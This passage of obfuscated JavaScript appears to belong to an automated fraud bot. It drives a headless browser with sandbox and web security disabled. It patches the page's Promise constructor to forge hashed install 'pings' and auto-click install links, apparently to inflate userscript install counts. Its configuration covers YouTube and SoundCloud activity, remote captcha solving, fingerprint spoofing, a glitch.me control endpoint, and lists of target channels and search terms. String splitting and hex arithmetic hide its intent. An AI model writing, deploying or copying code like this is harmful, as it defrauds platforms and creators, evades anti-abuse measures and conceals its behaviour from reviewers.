                K = Q[J - (0x238 + -0x2279 + 0x2044)] ^ Q[J - (-0x3f5 * -0x6 + 0x1411 + -0x1 * 0x2bc7)] ^ Q[J - (-0x5 * -0x3d5 + -0x2349 + -0x1 * -0x102e)] ^ Q[J - (-0x13f0 + -0x328 + -0x1a * -0xe4)], Q[J] = K << -0x1 * -0xb29 + 0x122 + 0xf2 * -0xd | K >>> -0x127 * -0x5 + -0x2275 * 0x1 + 0x1cd1;
              for (J = 0x1 * 0x19bf + -0x2497 + 0xad8; J < -0x264e + -0x14d3 + 0x17 * 0x293; J += -0x5f6 + 0x4df + 0x11c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1cf5 + 0x2518 + -0x40f * 0x2 | L >>> 0x251e * -0x1 + -0x21bc + 0x207 * 0x23) + (M & N | ~M & O) + P + (0x30d9ef43 + 0x9daab7c + -0xe * -0x2458feb) + Q[J] << -0x9 * -0x1ff + 0xcc7 + -0xa * 0x313) << 0x24 * -0xc7 + 0xa43 + 0x11be | P >>> 0x26e * 0x3 + 0x4cc + -0xbfb) + (L & (M = M << 0xb3 * -0x13 + 0x10d4 + -0x36d | M >>> -0x874 * -0x1 + 0x1921 + -0x23d * 0xf) | ~L & N) + O + (0x116aad * -0x961 + 0x47ee4e9a + -0x89 * -0x153f42c) + Q[J + (-0x2 * 0x29 + -0x1be0 + 0x1c33)] << 0x6 * -0x11b + 0x670 + 0x32) << -0x134a + 0xe2e + 0x521 | O >>> 0x1 * -0x1cf3 + -0x113b + 0x1 * 0x2e49) + (P & (L = L << 0xb * -0x14a + 0x1 * 0x1159 + -0x30d | L >>> 0x1162 + 0x69b + -0x17fb) | ~P & M) + N + (-0x1651fe01 + -0x9d28b821 + 0x59ff0fe9 * 0x3) + Q[J + (0x917 + 0x2d7 + -0x4 * 0x2fb)] << 0xf18 + 0x1b8d + -0x2aa5) << -0x199 * 0x1 + 0x23 * -0x10b + 0x261f | N >>> 0x3d6 * -0x1 + -0x1 * 0x1602 + 0x49 * 0x5b) + (O & (P = P << -0x2 * -0x1f5 + 0xd2b * -0x2 + 0x168a | P >>> -0x3ce * -0x8 + 0xcbb * 0x1 + -0x3 * 0xe63) | ~O & L) + M + (0x7e1ba680 + -0x6df71873 + 0x252ef5c6 * 0x2) + Q[J + (0x4b3 + 0xe * 0x285 + -0x27f6)] << 0x2c7 * -0x8 + 0x13d6 * 0x1 + 0x262) << 0x2 * 0xa97 + -0x1 * 0x2e3 + 0x923 * -0x2 | M >>> 0x15aa + 0x2 * 0x631 + -0x21f1 * 0x1) + (N & (O = O << 0xdc7 * 0x1 + -0x1f03 * -0x1 + 0x772 * -0x6 | O >>> -0x2182 + 0x1 * -0x1417 + 0x359b) | ~N & P) + L + (0x73b38687 * -0x1 + -0xdd64fed + 0xdc0c500d) + Q[J + (0xb * 0x342 + -0x1dc5 + 0x1 * -0x60d)] << -0x52 * 0x6e + 0x512 + -0x16 * -0x15f, N = N << -0x5 * -0x185 + 0x12b5 + 0x2 * -0xd18 | N >>> 0x1327 * -0x1 + -0x1 * -0x25be + 0x1295 * -0x1;
              for (; J < -0x310 + -0xb0f + 0xe47; J += -0x4de + -0xa7f * 0x1 + 0xf62)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * -0xb4d + 0x284 + 0x1233 * -0x2 | L >>> 0xc61 + -0x2 * 0x30a + -0x632) + (M ^ N ^ O) + P + (-0xd735e6f + 0x327fbf9e * -0x3 + -0x86a * -0x20c741) + Q[J] << -0x11 * -0xdf + 0x3 * 0x5d9 + 0xca * -0x29) << 0x455 * 0x9 + 0x869 + -0xfcb * 0x3 | P >>> 0x1 * -0x130f + -0x1 * 0x21 + 0x134b) + (L ^ (M = M << 0x11e7 + -0x2 * 0x9ad + 0x191 | M >>> 0x385 * -0x1 + -0x2072 + 0x23f9) ^ N) + O + (-0xc * 0x10b811a6 + 0x4be * -0xb5030 + 0x59 * 0x41a4231) + Q[J + (-0x1df * -0x9 + 0x4 * 0x419 + 0x2 * -0x109d)] << 0x935 * -0x4 + 0x183a + -0xc9a * -0x1) << -0x5ab + -0x59 * 0x1f + -0x5 * -0x34b | O >>> -0x20f0 + -0x1ecb + 0x3fd6) + (P ^ (L = L << 0x2102 + -0xd07 + -0x71 * 0x2d | L >>> -0xc56 + -0x385 * -0xb + -0x1a5f) ^ M) + N + (-0x4de86a85 + -0x86116370 + 0x142d3b996) + Q[J + (-0x236 * -0x7 + -0x1dc9 + 0x5 * 0x2dd)] << -0x1719 + 0x16f9 + 0x10 * 0x2) << -0x16 * -0x137 + 0xe0 + -0x1b95 | N >>> 0x1607 + -0x33 * 0x90 + 0x6c4) + (O ^ (P = P << -0x42e + -0x9 * -0x19c + 0x146 * -0x8 | P >>> 0xa4 * 0x35 + 0xef3 + -0x30e5) ^ L) + M + (0x5d01d01d * -0x1 + 0x9621f8c3 * 0x1 + 0x35b9c2fb) + Q[J + (0x2 * 0x229 + 0x1207 * 0x1 + -0x1656)] << 0x43 * 0x8d + 0xfba + -0x34a1) << 0x4b * 0x4 + -0x7 * 0x4d9 + -0x20c8 * -0x1 | M >>> -0x201 * 0xb + 0xd94 + 0x892) + (N ^ (O = O << -0x887 * 0x1 + -0xfa * 0x1 + 0x1 * 0x99f | O >>> -0x1 * -0x1d29 + 0x1b09 + 0x1c18 * -0x2) ^ P) + L + (0xdc1a5353 * 0x1 + 0x309 * -0x484553 + 0x6e1a0139) + Q[J + (-0x12 * -0x35 + -0x1 * -0x7e1 + -0xb97)] << 0x98f + -0x127 * 0x1f + -0x11 * -0x18a, N = N << -0xef * -0x13 + -0x9 * -0x2f4 + -0x2c33 | N >>> 0x1dc7 + -0x269 + -0x22 * 0xce;
              for (; J < -0x1 * 0x1594 + -0x7 * 0x479 + -0x11b5 * -0x3; J += -0x7 * 0x550 + -0xd * -0x16f + 0x1292)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xeb7 + 0xd3c + -0x1bee | L >>> -0xe * -0xd7 + -0x2131 + 0x158a) + (M & N | M & O | N & O) + P - (0x6af22e43 * 0x1 + -0x370908bb + 0x3cfb1d9c) + Q[J] << -0x6 * 0x656 + 0x2d9 * -0x1 + 0x28dd) << 0x50 * -0x71 + -0x21f2 + -0x5 * -0xddb | P >>> -0x158e + -0x4 * -0x17a + 0xfc1) + (L & (M = M << -0x237c + 0x338 + 0x2062 | M >>> -0x3db + 0xcd * -0xd + 0xe46) | L & N | M & N) + O - (0x31 * -0x435923f + -0x48b64ff2 + -0x47 * -0x584e533) + Q[J + (0x1 * -0x14e3 + 0x2107 + -0xc23)] << 0x315 * -0xb + 0x355 + 0x1e92) << 0x19b4 + -0x7 * -0x4cd + -0x3b4a | O >>> -0xab2 + 0x19b * 0x1 + 0x932) + (P & (L = L << 0xd41 + -0x790 + -0x593 | L >>> 0x1 * -0x3f8 + 0x629 + -0x22f) | P & M | L & M) + N - (-0x1 * -0x3a368a31 + 0x78b903c9 + 0xd35755e * -0x5) + Q[J + (0xe07 * 0x1 + 0x5 * -0x1eb + -0x9 * 0x7e)] << -0x4d * 0x2f + 0x51b * 0x1 + 0x22 * 0x44) << -0x7f * -0x19 + 0x197d + -0x25df | N >>> -0x958 + -0x69f + 0x1012) + (O & (P = P << -0x34 * 0x19 + -0x1d4 * -0x1 + 0x35e | P >>> -0x1 * -0xbc1 + 0x8 * 0x356 + 0x266f * -0x1) | O & L | P & L) + M - (-0x3d0 * 0x220c01 + -0x3df61dd1 + 0x130a824c5) + Q[J + (0x12c7 + -0x188f + 0x5cb)] << -0x1 * 0x236b + -0x1d47 + -0xb6 * -0x5b) << 0x4ce + -0x10 * -0x20a + -0x3d * 0x9d | M >>> -0x67 * 0x52 + -0x3d7 + 0x24f0) + (N & (O = O << -0xa1 * 0x4 + -0x4fc * 0x1 + 0x79e | O >>> -0x1 * -0x3d9 + 0x1c78 + -0x204f) | N & P | O & P) + L - (0x245c6672 + -0x8709081 * 0x7 + -0xf * -0x90a6337) + Q[J + (-0x2416 + -0x15 * 0xd5 + 0xab7 * 0x5)] << 0x1 * 0x142a + -0xcbb + -0x76f, N = N << 0x130a + 0x2149 * 0x1 + -0x3435 | N >>> -0x362 * -0x8 + 0x17a2 + 0x656 * -0x8;
              for (; J < 0x129d * 0x1 + 0xda * -0x4 + -0xee5; J += 0x16 * 0x17b + -0x1f1 * -0xc + -0x37d9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1f3a + 0x117b + -0x6e2 * -0x2 | L >>> -0x2 * -0x112d + 0x24e5 + -0x4724) + (M ^ N ^ O) + P - (-0xc12b * 0x7d01 + -0x3 * 0x200b02b8 + 0xf411067d) + Q[J] << -0x2d9 * 0x3 + -0x1cae + 0x2539) << 0x2109 + -0x1d55 + -0x3af | P >>> -0x1 * -0xcfb + -0xa3 * -0x35 + -0x2e9f) + (L ^ (M = M << -0x1b2 * -0x17 + 0x1 * 0x16a0 + -0x20 * 0x1ec | M >>> -0x1 * -0x2358 + -0x46e * 0x2 + 0x1 * -0x1a7a) ^ N) + O - (0x268b0c08 + -0x4f67248f + 0x5e7956b1) + Q[J + (-0x1591 + 0x2 * 0x4b8 + 0x611 * 0x2)] << 0x33a * 0x3 + 0x137b + 0x1d29 * -0x1) << -0x1803 + 0x2a3 + 0x1565 | O >>> -0xc54 + -0x1730 + 0xb * 0x33d) + (P ^ (L = L << 0xb5a + 0x2277 + -0x2db3 | L >>> 0x2661 + 0xd84 + -0x33e3) ^ M) + N - (0x42f45dfa + -0x5c9d2d49 + -0xb53267f * -0x7) + Q[J + (0x1371 + -0x53f * -0x7 + -0x3828)] << 0x3 * 0x37c + -0xa8d * 0x1 + 0x1 * 0x19) << 0x2011 + 0xf5f + 0x1 * -0x2f6b | N >>> 0xd6 + -0x1ac * 0x10 + 0x1a05) + (O ^ (P = P << 0x21b4 + -0x2099 * 0x1 + -0xfd | P >>> 0x1c39 + 0x75b + 0x2392 * -0x1) ^ L) + M - (-0x4efcfe2 * -0xb + 0x2 * -0x2c461fd3 + 0x57db8f1a) + Q[J + (0x19 * 0xf + 0x2f9 * 0x1 + 0x67 * -0xb)] << 0x29d + 0x347 * 0x6 + -0x1647) << -0x2531 * -0x1 + 0x1b8 * 0x2 + -0x4 * 0xa27 | M >>> 0x2 * 0x949 + 0x3 * -0x9e8 + 0xb41) + (N ^ (O = O << -0xf01 * -0x2 + -0x21c5 + 0x3e1 | O >>> -0x247e + 0xf4e + -0x1 * -0x1532) ^ P) + L - (-0x13633a19 + 0x5e207c76 + -0x1 * 0x15200433) + Q[J + (0xbf0 + -0x349 + -0x8a3)] << 0x22ac * 0x1 + -0x1 * -0x25f9 + -0x48a5, N = N << 0x1eb8 + -0x838 * 0x3 + -0x2f9 * 0x2 | N >>> -0xa * 0x1 + -0x1 * 0x425 + 0x431 * 0x1;
              this['h0'] = this['h0'] + L << 0x1f82 + -0x480 + -0x1b02, this['h1'] = this['h1'] + M << -0x13ed + 0x1654 * -0x1 + 0x2a41 * 0x1, this['h2'] = this['h2'] + N << 0xb55 + -0x26ae + -0x1b59 * -0x1, this['h3'] = this['h3'] + O << -0x5 * 0xe9 + 0x16bb * 0x1 + -0x122e, this['h4'] = this['h4'] + P << -0x8bd + 0x1 * 0x166a + 0x185 * -0x9;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x6 * 0x11c + -0x17 * 0x13a + 0x22fa & 0x4 * -0x2f0 + -0x2250 + 0x2e1f * 0x1] + w[J >> 0x23f3 + -0xa06 + -0x19d5 & -0x1 * -0x7b2 + 0x85d + -0x1000] + w[J >> -0x7f5 + 0x184b + -0x1042 * 0x1 & -0x181a + 0x227 * 0x10 + -0xa47] + w[J >> 0x80a * 0x1 + 0x2387 + -0x103 * 0x2b & 0x326 + 0x1 * -0xdad + -0x2 * -0x54b] + w[J >> -0x1971 + 0x9b6 * -0x1 + 0x1 * 0x2333 & 0xc95 + -0x2426 + 0x17a0] + w[J >> 0x113b + -0x2 * -0x12d6 + 0x1 * -0x36df & -0x2221 * 0x1 + -0x108c + -0x11 * -0x2fc] + w[J >> -0x1 * -0x23e0 + 0x2249 + 0x4625 * -0x1 & -0x1 * 0x1181 + -0x123 * 0x2 + 0x13d6] + w[-0x3df * -0x3 + 0x1 * 0x1bc5 + 0x1 * -0x2753 & J] + w[K >> -0x1 * 0x149a + -0x7b * -0x4 + 0x12ca & 0x3 * 0x295 + 0x14bc + -0x1c6c] + w[K >> -0x2af + -0x1 * 0x923 + 0x3d * 0x32 & -0x6e0 + -0xe * -0xe3 + -0x57b] + w[K >> 0x1 * 0x2379 + 0x1 * 0x577 + -0x28dc & -0x2 * -0x1b8 + -0x170 * -0x2 + -0x641] + w[K >> -0x4 * 0x7fa + 0x1 * -0xb71 + 0x2b69 & -0xe8 * 0x10 + -0x2286 + 0x3115] + w[K >> -0xb81 + 0x1373 + 0x151 * -0x6 & -0x17bf + 0x8e3 + -0x13 * -0xc9] + w[K >> 0x2393 + 0x102 * 0x1d + -0x40c5 & -0x19 * 0x89 + -0x1517 + 0x2287 * 0x1] + w[K >> -0x974 + -0x66 * -0x40 + -0x1008 & -0x1 * -0x53b + 0x1 * -0xc57 + 0x5 * 0x16f] + w[0x2 * -0x1106 + -0x257 * 0x2 + -0x1 * -0x26c9 & K] + w[L >> 0x10a0 + 0x2 * -0x6c3 + -0x2fe & 0x1 * -0xf16 + -0x483 + 0x13a8] + w[L >> -0x1ff + 0x1d8a * -0x1 + 0x1fa1 & -0xa * -0x11b + -0x7bb * 0x5 + 0x1ba8] + w[L >> 0x5 * -0x7b9 + -0x10 * 0x83 + 0x2ee1 & 0x1e * 0xd4 + -0x1 * 0x1445 + 0x121 * -0x4] + w[L >> -0x13 * 0x96 + -0x1 * -0xe59 + 0x327 * -0x1 & -0x15c8 + -0x1edc + 0x34b3] + w[L >> -0x85 * 0x1a + -0xde8 + 0x1b76 & -0xc9c + -0x151 * -0x1 + 0x1 * 0xb5a] + w[L >> -0x26e3 + 0x81f + -0xf66 * -0x2 & 0x1 * 0x1961 + 0x3d4 + -0x1d26] + w[L >> 0x1e67 * -0x1 + -0x18 * -0x2c + -0x35 * -0x7f & -0x11b8 + -0x1 * 0xeb7 + -0x2 * -0x103f] + w[0x16ff + -0x2261 * -0x1 + 0x43 * -0xdb & L] + w[M >> -0x172b + 0x224a + -0x1 * 0xb03 & -0x570 + -0x119 * -0x9 + -0x33 * 0x16] + w[M >> 0xfaf + -0x17 * -0x16d + -0x3062 & 0x11d7 + 0x4 * -0x4db + 0x1a4] + w[M >> 0x1cd6 + 0x196a + -0x362c & 0xbd7 + 0x1 * -0xf9 + -0xacf * 0x1] + w[M >> -0x32 * 0x2 + 0xd * -0x12a + -0x13 * -0xd2 & 0x189d + -0x5 * -0x687 + -0x3931] + w[M >> -0x1144 + -0xcdf + 0x1e2f & -0x2 * -0x7b5 + 0x9cf + -0x192a * 0x1] + w[M >> -0x1750 * -0x1 + -0xda + -0x166e & -0x9e * 0x13 + 0x1 * -0xb37 + -0x10 * -0x170] + w[M >> 0xb49 + -0x16c1 + 0xb7c & -0x1 * -0x1d62 + 0x1 * 0x19a3 + -0x36f6] + w[-0x15e3 + 0x1 * 0x79d + 0xe55 * 0x1 & M] + w[N >> -0x9f8 + -0x11d4 * -0x1 + -0xf8 * 0x8 & -0x195c + 0x185 * -0x13 + 0x2 * 0x1b25] + w[N >> -0x85 + 0x1 * -0xd4f + 0xdec & 0xb30 + 0x5b5 + -0x10d6] + w[N >> 0x1e * -0x125 + -0xbcf + -0x2e39 * -0x1 & 0x134c + 0x2db * -0x3 + -0xaac] + w[N >> 0x22fe + -0x585 + -0x1d69 & 0x1c36 + 0x258c + -0xb * 0x5f9] + w[N >> -0x1cd + 0x179 * 0x7 + -0x876 & 0x250b + 0x1445 + 0x1 * -0x3941] + w[N >> 0x1442 + 0x4 * -0x757 + -0x14e * -0x7 & -0x479 * 0x8 + -0x1 * -0x2695 + -0x2be] + w[N >> 0x3e1 + 0xe5 * -0x17 + 0x10b6 & 0x24f8 + 0x47e + -0x2967] + w[-0x1 * 0x26f1 + 0x70e * -0x2 + -0x3 * -0x11b4 & N];
            }
            [W(0x5)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * 0xc73 + 0x23d0 + -0x353 * 0x7 & -0x2c2 * 0x9 + 0x1223 * 0x2 + -0xa75,
                J >> -0x1d39 + -0x1613 * -0x1 + 0x47 * 0x1a & -0x2a7 + 0xcd9 * 0x2 + -0x14c * 0x11,
                J >> -0x1 * 0xcaa + 0x1f * -0x6 + -0x2 * -0x6b6 & 0x2 * 0x107 + -0x14d + 0x1f * 0x2,
                -0xa5a + -0x1644 + -0x6b9 * -0x5 & J,
                K >> -0x3 * -0xc77 + 0x1a1f + -0x9 * 0x70c & -0x118d * -0x1 + 0x26e4 + -0x12e * 0x2f,
                K >> -0x4 * -0x40e + -0x1 * -0x1f97 + 0x2cf * -0x11 & 0xa6d * 0x1 + -0x119f + 0x831,
                K >> 0x1e93 * 0x1 + -0x7 * -0x15f + -0x2824 & -0x2 * -0x7a3 + -0x1296 + 0x44f,
                0xe10 + 0x437 + 0x9e * -0x1c & K,
                L >> 0x1 * 0x2135 + 0x1c1 * 0x8 + -0x2f25 & 0x260d + 0x2456 + -0x7 * 0xa7c,
                L >> -0x1 * -0x6a2 + 0x2 * 0x263 + -0xb58 & -0x1a3a + -0x17ba * -0x1 + 0x37f,
                L >> 0xd1c + -0x1bcd + 0xeb9 & 0x998 + -0xfaf + -0x716 * -0x1,
                0x1 * -0x1d27 + -0x2122 + 0x3f48 & L,
                M >> -0x11de + 0x177 + 0x107f & -0x37 + -0x1 * 0x572 + 0x238 * 0x3,
                M >> 0x8f0 + -0x922 * 0x1 + 0x42 & -0x2 * -0x29f + 0x1763 * -0x1 + -0x32 * -0x62,
                M >> -0x726 * -0x4 + 0x2b * -0x53 + -0xe9f & -0xdca + 0x7d1 * -0x3 + 0x263c,
                -0x14 * 0x1a3 + 0x136b * -0x1 + 0x3526 & M,
                N >> -0x55 * -0x52 + 0x22c9 + -0x3deb * 0x1 & 0x1fb9 + 0x113c + -0x2ff6,
                N >> 0x1 * 0x23a7 + -0x1ad6 * -0x1 + -0x3e6d & 0x1 * -0x2aa + 0x1255 + 0xeac * -0x1,
                N >> -0x1810 + 0x46c + 0x13ac & 0x95 * -0x13 + 0x7d * -0x35 + 0x25ef,
                -0x156b * -0x1 + -0x1a33 + 0x5c7 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2239 * 0x1 + 0x48 + -0x1 * -0x2205), (K = new DataView(J))['setUint32'](0x591 * -0x5 + 0x29 * 0x3a + 0x128b, this['h0']), K['setUint32'](-0x167a + 0x3 * -0x86d + 0x2fc5, this['h1']), K['setUint32'](-0x353 * 0x5 + -0xcd * 0x19 + -0x4 * -0x92b, this['h2']), K['setUint32'](-0xc0a + -0x1184 + 0x6 * 0x4ef, this['h3']), K['setUint32'](0x3 * -0x517 + -0xf50 + -0x621 * -0x5, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x15a * -0xa + -0x1 * -0x1ac1 + -0x2845];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1 * 0x50f + 0x12e7 + 0x8 * -0x1bb;
            J[0x1a * 0xc2 + 0x155b * 0x1 + -0x290f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xc1d + 0x86 * -0x43 + 0x16f5] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2428 + 0x1643 + 0x251 * 0x6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x18fd + 0x2388 + -0x3c84;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x226 + -0x8d * -0x25 + -0x10ab), Promise['resolve'](0xc28 + -0x1 * 0x134b + 0x724);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1456 + 0x1 * 0x767 + 0xcef; j < -0x1 * -0x1d83 + 0x2 * -0xb4 + -0x6 * 0x4af; j++)
    i();
}
const NETWORK_PATIENCE = 0x1ea0 + 0x7ed * 0x1 + -0x74d + (0x19f8 + -0x1dda + 0xf9a) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0xa85 + 0x1dcb + -0x1343) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xcdc + -0x153b + 0x85f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x13ab + 0xb2b * 0x3 + -0xdd6);
    let h = e[f];
    if (b['VfVtVj'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2 * -0x653 + -0x57a * 0x3 + 0x1d14, s, t, u = -0x2267 * -0x1 + -0x2422 + -0x1 * -0x1bb; t = n['charAt'](u++); ~t && (s = r % (-0x2483 + -0x21bf + -0xa * -0x707) ? s * (0x12a * -0x5 + 0x137f * 0x1 + -0xd6d * 0x1) + t : t, r++ % (-0x17b3 * -0x1 + -0x1908 + 0x17 * 0xf)) ? p += String['fromCharCode'](-0x3b6 * 0x3 + 0x43a * -0x6 + 0x257d & s >> (-(0x25 * 0xc5 + -0x271 * -0x5 + -0x28ac * 0x1) * r & 0x539 * -0x7 + 0x1ced + -0x1c * -0x46)) : -0x3 * 0xb2d + -0x10f * 0x1f + 0x4258) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * -0x106e + 0xa75 * -0x3 + 0x2fcd, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * 0xf93 + 0x14cb * 0x1 + -0x528))['slice'](-(0x50d + 0x1798 + -0x1ca3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xc * -0x71 + -0x2616 + 0x1 * 0x2b62,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1a * 0x125 + -0x68c + 0x1 * -0x1736; u < -0x20ec + -0x1d2f + 0xc9f * 0x5; u++) {
          p[u] = u;
        }
        for (u = -0x199a + 0x2322 + -0x988; u < 0x2f5 * 0x3 + 0x1e03 + -0x12f1 * 0x2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xf06 + 0xc5 * 0x8 + 0x6ba * -0x3), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xe03 * 0x2 + -0x199 * 0x13 + 0x255, q = -0x1aef + -0xd * -0x39 + 0x22 * 0xb5;
        for (let v = -0x709 + 0x2 * 0x199 + 0x3d7 * 0x1; v < n['length']; v++) {
          u = (u + (-0x22d * 0x5 + -0x20ef + 0x2bd1 * 0x1)) % (0x2 * -0xa49 + -0x2572 + 0x3 * 0x13ac), q = (q + p[u]) % (0xee7 + -0x8e * -0x2e + 0x276b * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1f08 + 0x67f + 0x1 * -0x2487)]);
        }
        return t;
      };
      b['EElRQw'] = m, c = arguments, b['VfVtVj'] = !![];
    }
    const j = e[-0x13 * -0xdd + -0x1 * -0xc47 + -0x1cae * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['ypYjLR'] === undefined && (b['ypYjLR'] = !![]), h = b['EElRQw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 